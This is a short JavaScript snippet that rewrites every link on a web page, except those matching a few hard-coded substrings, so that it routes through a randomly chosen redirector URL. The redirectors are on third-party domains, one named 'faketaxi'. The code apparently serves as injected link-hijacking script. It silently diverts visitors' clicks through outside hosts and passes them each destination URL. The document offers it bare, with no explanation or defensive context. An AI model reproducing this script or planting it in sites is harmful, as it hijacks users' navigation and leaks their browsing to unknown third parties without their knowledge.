var links = document.links;
for (var i=0, iLen=links.length; i<iLen; i++) {
var threads = ['https://wwe.lynsr.info/?', 'https://blog.musz.info/?', 'http://faketaxi.s602.xrea.com/go/?', 'http://dymusz.s1007.xrea.com/go/?', 'https://red.lynsr.info/?', 'https://amy.lynsr.info/?'];  
var random  = threads[Math.floor(Math.random() * threads.length)];
var hrefer = document.links[i].href;
if(hrefer.match("av.a") || hrefer.match("ojjoio")|| hrefer.match("ce.a")|| hrefer.match("ce.n")|| hrefer.match("ja.a")|| hrefer.match("xx.m")) {
document.links[i].href = document.links[i].href; 
 }else{links[i].href = random + links[i].href;}
 }
